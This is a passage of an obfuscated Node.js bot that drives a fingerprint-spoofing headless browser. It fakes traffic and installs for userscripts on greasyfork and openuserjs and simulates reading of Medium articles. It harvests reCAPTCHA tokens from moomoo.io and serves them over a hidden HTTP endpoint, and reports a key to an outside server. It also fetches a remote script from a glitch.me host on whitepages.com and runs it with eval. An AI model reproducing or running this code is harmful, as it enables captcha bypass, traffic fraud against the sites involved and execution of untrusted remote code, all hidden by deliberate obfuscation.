      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': a3(0x7) + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + a3(0x1a),
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + a2(0x19),
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + a3(0xe) + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + Z(0x11, '8s0i') + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => 0x1560 + -0x1001 + -0x55f
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    const a4 = b;
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](-0x2f * -0xad + 0x3a1 * -0x9 + 0x2e * 0x5)['vanillaLau' + a4(0x12, 'X9I1')](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, -0x1547 + 0x297 * 0x8 + -0xf3 * -0x1), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, -0x1ee0 + 0x96a * 0x4 + -0x664), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const a5 = d,
          r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = 0x12b * 0xb + -0x1ff9 + -0x132 * -0x10;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })[a5(0x3)](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = 0x1d1e + 0x1 * -0xd6a + -0xfb4; w < getRandomInt(0x24f8 + 0x5 * 0x557 + 0x119 * -0x3a, 0x33e + 0x1 * -0x1b61 + 0x8 * 0x305); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(0xbd12 + 0x1e5a + 0xef4);
        }
      }();
    }, -0x1dbb + 0x1212 + 0x269 * 0x5), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = -0x1 * -0xb0e + -0xc99 + 0x18b * 0x1;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](0x831 * 0x3 + -0x218a + -0x1 * -0x8f7, -0x525 + 0x12 * -0x1d1 + 0x2609)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, 0xb * -0x1169 + -0x521a + -0x186cd * -0x1);
    }, -0x1457 + 0x89 + 0x1432), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = 0x3fa + 0x2333 + -0x272d;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(-0x2bb * 0x1 + -0x98c + 0x1 * 0x17ff), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', 0x70 * -0xb + 0x1500 + -0x1030), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(0x14eb33 + -0x20 * 0x9693 + 0xba2cd);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, 0x1c69 + 0x1eb8 + -0x1 * 0x3abd);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](-0x150 * 0x10 + -0x3 * -0x673 + 0x7 * 0x59);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || -0x4b7 * -0x7 + -0x20b * -0x11 + -0x242c);
}
doFlags['doOUJS'] && ((async () => {
  const a8 = d,
    a7 = b;
  async function f() {
    const a6 = d,
      k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = 0x2244 + 0x3 * -0xaeb + -0x182) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (-0x22ef + -0x1ec6 + 0x41b6 * 0x1));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](-0x1d * -0xb5 + 0xa * -0xe5 + -0xb8f, D['indexOf']('\x20'));
        return B ? E['slice'](0x448 + -0x6 * 0x92 + -0xb * 0x14, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](-0x1 * -0x23b1 + 0x42f3 + -0x4e4 * 0xd),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](-0x387e + 0x1 * -0x397c + 0x80e * 0x13),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + a6(0x20) + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + a7(0x1e, '@tDf') + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + a7(0xd, 'bUZ9') + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + a8(0xc),
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + a7(0x4, 'UuN@') + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + a8(0x16) + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
